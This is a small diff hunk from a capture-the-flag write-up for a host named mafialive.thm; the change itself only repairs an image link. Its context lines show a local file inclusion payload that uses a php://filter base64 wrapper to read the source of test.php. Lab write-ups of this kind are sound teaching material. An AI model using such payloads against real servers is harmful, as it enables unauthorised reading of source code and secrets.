@@ -66,7 +66,7 @@ Let's try a php filter to exfiltrate data:
 
 Let's do it with the entire test.php page:
 `http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php`
-![(https://github.com/user-attachments/assets/610df6ee-0757-4ce7-944c-fcbc48672fb8)
+![](https://github.com/user-attachments/assets/610df6ee-0757-4ce7-944c-fcbc48672fb8)
 
 
 
